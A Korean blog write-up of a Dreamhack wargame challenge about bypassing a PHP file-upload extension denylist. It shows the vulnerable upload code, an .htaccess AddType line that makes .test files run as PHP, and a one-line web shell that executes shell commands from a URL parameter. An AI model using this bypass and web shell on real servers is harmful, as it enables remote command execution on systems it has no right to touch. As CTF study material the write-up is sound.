---
title: "[ Dreamhack ] Apache htaccess"
description: "문제 페이지에 접속해보면 파일을 업로드 할 수 있는 페이지가 있다.제공된 소스코드를 보면 php, php3, php4 등의 확장자를 필터링 하고 있다.php 이외의 파일은 필터링이 없으므로 .htaccess파일을 업로드 한 뒤 다른 확장자로 웹 쉘을 실행시킬 수 있다."
date: 2023-04-01T14:11:40.850Z
categories: [Wargame, Dreamhack]
tags: ["dreamhack","web"]
---
![](/images/2ea3a3d8-b7bf-4cb6-b76d-b8c76d9ae412-image.png)

<br>

<br>

### **문제 분석**

---

![](/images/142c320b-a853-4648-a81f-d760c37ced88-image.png)

문제 페이지에 접속해보면 파일을 업로드 할 수 있는 페이지가 있다.

<br>

<br>

```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
?>
```
제공된 소스코드를 보면 php, php3, php4 등의 확장자를 필터링 하고 있다.

<br>

<br>

### **문제 풀이**

---

php 이외의 파일은 필터링이 없으므로 .htaccess파일을 업로드 한 뒤 다른 확장자로 웹 쉘을 실행시킬 수 있다.

>.htaccess는 웹서버 접근 제어 파일로, 내부적으로 새로운 타입을 명명하거나 디렉토리 접근 권한 등 다양한 설정을 변경할 수 있다.

<br>

<br>

따라서 다음 내용이 들어간 .htaccess 파일을 만들어 업로드 하면 .test확장자를 가진 파일 역시 php로 동작하게 된다.
```
AddType application/x-httpd-php .test
```

<br>

<br>

![](/images/a8b019d2-6ddf-4d62-8a39-495959d06ddf-image.png)

정상적으로 .htaccess 파일이 업로드 되는 것을 확인할 수 있다.

이후 확장자가 .test인 웹쉘을 업로드 해주면 문제를 해결할 수 있다.

<br>

<br>

```php
//webshell.test
<?php
	system($_GET['cmd']);
?>
```

<br>

<br>

![](/images/673d34f3-8246-4e61-9fa2-adc2abf4c354-image.png)
![](/images/3a65587c-cbd5-4a73-a0ac-f293e033a821-image.png)

업로드한 webshell.test파일이 정상적으로 작동하게 된다.

<br>

<br>

![](/images/b1c9bb5d-eaff-47e7-a57e-13e95c19198a-image.png)
![](/images/a207798f-f7ed-42f0-a141-6822cf01092c-image.png)

flag파일을 찾아 실행시키면 flag를 얻을 수 있다.